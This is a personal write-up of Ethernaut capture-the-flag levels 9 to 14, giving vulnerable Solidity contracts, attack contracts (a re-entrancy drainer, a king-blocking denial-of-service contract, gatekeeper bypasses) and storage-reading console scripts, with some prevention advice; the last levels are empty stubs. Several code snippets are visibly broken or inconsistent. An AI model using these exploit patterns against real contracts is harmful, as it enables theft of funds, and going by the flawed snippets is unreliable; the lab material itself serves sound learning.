# Ethernaut Game

👩‍🚀 I'm completing [The Ethernaut](https://ethernaut.openzeppelin.com/) Game! 

Migrated some challenges over to the the blog posts over here:
- [Part 1: Challenges 1-3](https://eda.hashnode.dev/how-to-hack-smart-contracts)
- [Part 1: Challenges 4-7](https://eda.hashnode.dev/hacking-smart-contracts)

----

Sections:
 - [Prerequisites](#prerequisites)
 - [King](#9-king)
 - [Re-entrancy](#10-re-entrancy)
 - [Elevator](#11-elevator)
 - [Privacy](#12-privacy)
 - [Gatekeeper One](#13-gatekeeper-one)
 - [Gatekeeper Two](#14-gatekeeper-two)
 - [Naught Coin](#15-naught-coin)
 - [Preservation](#16-preservation)
----

## Getting Started 

To play the Ethernaut Game there are some steps to do at each level. Here are the Prerequisites and the Steps to setup the levels. 

#### Tools & Prerequisites:
1. [MetaMask](https://metamask.io/) Wallet
2. Rinkeby Testnet ETH: You can get some from the [Rinkeby](https://rinkebyfaucet.com/) or [Paradigm](https://faucet.paradigm.xyz/) faucets. 
3. Console on Google Developer Tools 
4. [Remix](https://remix.ethereum.org/): Online Ethereum IDE

#### Steps:
1. Connect your wallet to the Ethernaut website. 

2. On each challenge you'll need to click "Get a New Instance." You'll need to approve the popup on your MetaMask and pay a transaction fee.  This button will deploy a smart contract. * You will not become the owner of the smart contract, instead an Ethernout account will. 

3. Open the Google Developer Tools Console. This is how to interact with the smart contract. 

4. On some challenges you'll need to deploy a smart contract. You can deploy one on [Remix](https://remix.ethereum.org/) without any additional setup. On Remix select "Injected web3" when deploying the smart contract to deploy from your Metamask. 
 
---

### 9. King  

> When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

This hack is about a game called King of ether: https://www.kingoftheether.com

here's how the game is played as explained on the ethernaout site:

> The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

We want to hack the contract so that no one can become king. 

First some key notes and then the contract:

- Now important to note that when you are making a transaction to another smart contract you should have an error handling mechanism. If the smart contract you are making a call to fails than you transaction will not pass. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
``` 

to hack the contract no one should be able to call "king.transfer(msg.value);"

#### Solution: 

1. we'll create a new smart contract on Remix.
2. create a new solidity file attackking.sol 
3. here is how the contract should be, have a look at the comments for whats going on. 
-our contract will become the king, then when someone else wants to become king we are not going to allow them to transfer the ownership 
- we can just not put a fallback function on our contract and then noone can reclaim ownership 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackKing {
  constructor(address _king) public payable {
    address(_king).call.value(msg.value)();
  }

  function() external transfer {
    revert("you loose!");
  }

}
``` 

The transfer function will not work on this smart contract. You shouldn't assume that the smart contract you make a function call to will have its error handling or a fallback function by default. 
4. check the prize value in the contract. we need to put more money than the curent price amaount. 
await contract.prize() // in gwei
await contract._king() // get the current king
5. deploy the malicious smart contract with a larger amount than the prize. 
6. check who is the king 
await contract._king() // get the king

---
### 10. Re-entrancy  

>The goal of this level is for you to steal all the funds from the contract.

This is an important attack type, that became famous with the [DAO Attack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). After the Attack Ethereum forked to undo the malicious transaction. It became: Ethereum and Ethereum Classic. Ethereum Classic kept the malicious transaction. Its an important point in the history of Ethereum where the transaction was undone by individuals. 

Here are important background information and then an overview of the smart contract we'll be hacking for this level.
- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.

Here's the smart contract that contains the re-rentrancy vulnerability:


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances; // internal recording 

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) { // internal helper 
    return balances[_who];
  }

  // the amount is sent out of the account before the state var is updated!
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}(""); // one of the ways to send money 
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount; // update the internal balance recording 
    }
  }

  receive() external payable {}
}
``` 

The hack to the contract will be by writing another smart contract that will take advantage of the vulnerability.

We create a recursive re-rentrancy loop. In this loop we withdraw the funds before the balanaces are updated. 

####  Solution:
1. Open Remix and import the smart contract. Change the safemath libary location:
"import https://github/openzeppelin/contracts/math/SafeMath.sol"
change receive to fallback 
2. create a new smart contract called ReentranceAttack.sol
3. here is the code for the ReentranceAttack.sol. deploy the contract with some ether (you will need to pay for gas)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Reentrance.sol';

contract ReentranceAttack {
  
  Reentrance public reentranceContract;
  uint public amount =  ether; // withdraw each time

  constructor(address _reentranceContractAddress) public {
    reentranceContract = Reentrance(_reentranceContractAddress);
  }

  function donateToTarget() public {
    reentranceContract.donate.value(amount).gas(4000000)(address(this)); 
}

  fallback( ) external payable  {  
    if (address(reentranceContract).balance != 0){
      reentranceContract.withdraw(amount);
    }
  }

}
``` 
4. add some funds to the vulnerability contract. 
5. execute the function on your attack function. 

**how to prevent the attack:**
- make sure to update the state variable before you make a function call to an external contract. this is also called as "checks and effects best practice on solidity."
- mutex: puts a lock on a contract state and then only the owner can unlock. this ensures that only a signle funtion is execute at the same time. (have a modifer that checks if the contract is locked or not. locked meaning that theres a function call thats curently executing.) this way someone can not call the function recursively while the function is already executing. heres how the code looks like:

```solidity
bool internal locked;

// add this modifier to the withdraw func
modifier noReentrancy{
  require(!locked, "no more re-rentrancy");
  locked = true;
  _;
  locked = false;
}
``` 

---
### 11. Elevator 

> This elevator won't let you reach the top of your building. Right?

The goal of the hack is to reach the top of the building. Let's clear some terms and then have a look at the smart contract that we'll be hacking for this step. 

- Interface in solidity: they help to generate an API for the contract so that the smart contracts can communicate.  
- [Visibility](https://solidity-by-example.org/visibility/ ): defines who can call the function (public, private, internal, external)
- [Modifiers](https://docs.soliditylang.org/en/v0.8.14/cheatsheet.html?highlight=modifiers#modifiers): how functions will interact with the state on the blockchain (eg: view would allow you to read from the blockchain but not modify). The default is that it will allow to read and change the data on the blockchain. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// interface specifies the name of the fucntion that the object needs to implement
interface Building {
  function isLastFloor(uint) external returns (bool);
}

// the contract to hack 
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) { //isLastFloor is in the Building contract 
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

``` 

Check which floor you are on:
```
await contract.floor()
``` 

####  Solution:
1. Open Remix and import the smart contract. 
2. Create a new smart contract: ElevatorAttack.sol and import the Elevator.sol file. 
Here's how the attcak contract should look like:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Elevator.sol';

contract ElevatorAttack {
  bool public toogle = true;
  Elevator public target;

  constructor(address _targetAddress) public {
    target = Elevator(_targetAddress);
  }
  
  function isLastFloor(uint) public returns (bool){
    toggle = !toogle;
    return toogle;
  }
  
  function setTop(uint _floor) public{
    target.goTo(_floor);
  }
}

``` 

3. Deploy the smart contract with the target address
contract.address()

4. Call the setTop function on Remix with floor number: 10 for example. 

We bascially added a new logic for the interface function because the interface allows us to modify the state. 

---
### 12. Privacy 

> The creator of this contract was careful enough to protect the sensitive areas of its storage.

> Unlock this contract to beat the level.

So, we're going to have to unlock the contract in order to pass the level. 

Let's cover some of the basics needed for the challenge and then the smart contract.
- Casting: In solidity you need to define the type of the varibale. Its a static language. 
https://www.tutorialspoint.com/solidity/solidity_conversions.htm
- Web3 provider: metamask is a user wallet that injects and object called web3 to comunicate to the blokchain. 

The contract has different variables and not many functions. It only has a contructor and a function called unlock. When we pass the right key into the unlock funtion, then we can unlock the lock. The goal is to get the last elment in the data array. (index starts at 0)

Storing sensitive information on a blockchain is not a good idea, anyone can retriev it. You can hash it but then you need to keep your keys safe. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true; // first state variable 
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data; // declares an array of size 3 

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2])); // if it equals the last element of thr data array 
    locked = false; // unlock the lock :-) 
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

``` 
checkout the: contract.abi

All state varibales in a smart contract are there for anyone to read, even the private ones. In Ethereum the code, and so the variables are stored in slots. The more storage space a smart ocntract consumes the more gas it consumes, so as a contract developer you need to opimitize the space you use for your contract. You should optimize the posisiton of your variables to optimize for gas (you can remove the need to have an extra slot). 

####  Solution:
Since all the variables are stored in slots, when we figure out which slot to get we can get the last variable on the data array. Passing this variable will allow us to unlock the contract. Let's query everything in the contract. 
1. web3.eth.getStorageAt(SLOT_TO_QUERY). 
2. Instead of trying one by one here is a script to query and give us all the data in the storage:
```
let storgae = []

let callBackFNConstructor = (index) => (error, contractData) => {
 storage[index] = contractData
}

for (var i = 0, i<6) { // 6 because there is a max 6 variables in storage 
 web3.eth.getStorageAt(contract.address, i, callBackFNConstructor)
}
``` 
Copy and paste in your browser. The storage array should be populated that represents the slots. 
3. On index 3 there are 3 variables:
- 265: ff 
- 10: 0a
- awkwardness: 9cb3 
Solidity was able to optmize and fit the 3 variables in one. 

The last 3 slots represent the data array. Each element in the array has its own slot. So we know that to unlock the contract we need the last item on the index array. It is the last element on the storage array, index: 5
storage[5] // this is the element that we need to convert to a byte format. 
4. Go to remix and create an attack contract. This attack contract will call the privacy contract and pass the value in the unlock function. 
5. Copy the Privacy contract, we will import it on our attack contract. 
5. Here is how our attack contract should look like. 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Privacy.sol';

contract PrivacyAttack {
  Privacy target;

  constructor(address _targetAddress) public {
    target = Privacy(_targetAddress);
  }
  function unlock(byte32 _slotValue) public{
     byte16 key = byte16(_slotValue); //type conversion in solidity, aka: casting 
     target.unlock(key);
  }
  
}
``` 
6. Deploy the privacy attack contract with teh address of the deployed Privacy contract 
7. Execute the unlock function with the key at storage[5] (its the last slot on the Privacy contract)
await contract.locked()

Lesson learned: if you store data on the blockchain its viewable by everybody. nothing is ever private on a blockchain. the way you declare the varaiable defines how much storage space it will take up. 

---
### 13. Gatekeeper One 

> Make it past the gatekeeper and register as an entrant to pass this level. 

Let's first review the tips that are given to us in the challeneg:
- special function gasleft(). (Note: you can play around with the gas settings in the complier settings tab and see what is changed.)
- tx.origin vs. msg.sender: this was covered in the previous telephone challange. Remember that only wallet addresses can be tx.origin (they are an EOA account). On the other hand, msg.sender can be both a wallet address and a user address. Msg.sender is typically who you want to authenticate. 
- Date type conversions: when you convert a data type which uses a large storage to a smaller one you will loose the space it takes up. This means that the data will be lost or corrupt. 

####  Solution:
1. To pass GateOne we will create contract to be a middleman. Create a contract called GateHack.sol with the following:
contract Hack {
    GatekeeperOne gate = GatekeeperOne(//YOUR ADDR);
    ...
}
2. To pass Gate3 we will use the data conversion. Bascially it needs to fullfill: bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
3. To pass Gate2 the gas multiplier needs to be a multiplier of 8191. In order to pass we need to calculate the gas. Look at the compiler version & settings on Etherscan. 
The contract was compiled with:
- version v0.4.18  
- no optimization enabled
4. Create a function to allocate a specified amount of gas. 
function hackGate() public {
    gate.call.gas(99999)(bytes4(keccak256('enter(bytes8)')), key);
}


Bottom lines:
- Do not use tx.origin as an authorization check!!
- Be careful with data conversions and corruptions 
- Save gas by not storing unnecassry variables and doing less operations 
- Different complier settings yield different gas so be careful with using it to make checks. 

---
### 14. Gatekeeper Two 

> Register as an entrant to pass this level.

It is similar to Gatekeeper One, now we have different gates which introduces a few new challenges. 

Let's review the topics first:
- Solidity modifiers
- Assembly keyword: allows a contract to access functionality that is not native to vanilla Solidity. It basiclly allows you to access the EVM at a lower level, this gives you more control. 
- The ^ character in the third gate is a bitwise operation (XOR). Bitwise operations allow to make optimizations to the code, you can save space and make the operation faster. 

Here's how we can pass the gates:
1. For Gate 1 it is the same as the previous challenge. We need to create a sperate smart contract in the middle that will take advantage of using tx.origin (EOA) and the msg.sender (last account). Msg.sender will be the calling sender smart contract, the tx.origin will be our wallet address.  

2. For Gate 2 it introduces the assembly keyword. The extcodesize is a code to give the size of the smart contract code size and assigning it to the variable x. Basically we want the calling contract size to be 0. 

3. For Gate 3 takes a _gateKey and the requirement is that the XOR operation is equal to uint64(0) - 1.
(PUT AN XOR Image)

####  Solution:
1. Go to remix and create a GatekeeperTwoAttack.sol contract. 

2. Here is how the contract should look like, you can see the comments that explain how we pass the gates:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwoAttack {

  constructor(address _address) public {
    // we will pass gate3 with the key 
    bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    
    // abi.encodeWithSignature how to call a function without importing the interface
    // this contract call is happening in the constructor, if you try to check a code during the constructor it will return an empty value
    // thats because the contract has not been made yet. It has an address, but its not finished so the size will be 0. 
    // thats how we pass gate 2
    _address.call(abi.encodeWithSignature('enter(bytes8)', _key)); 
   
  }
}
```

3. Compile the contract with the original GatekeeperTwo address. 
contract.address 

---
### 15. Naught Coin 

> NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

``` 
####  Solution:

---

### 16. Preservation 

> The goal of this level is for you to claim ownership of the instance you are given.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

``` 
####  Solution:

---

### 16. NAME 

> desc

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

``` 
####  Solution:
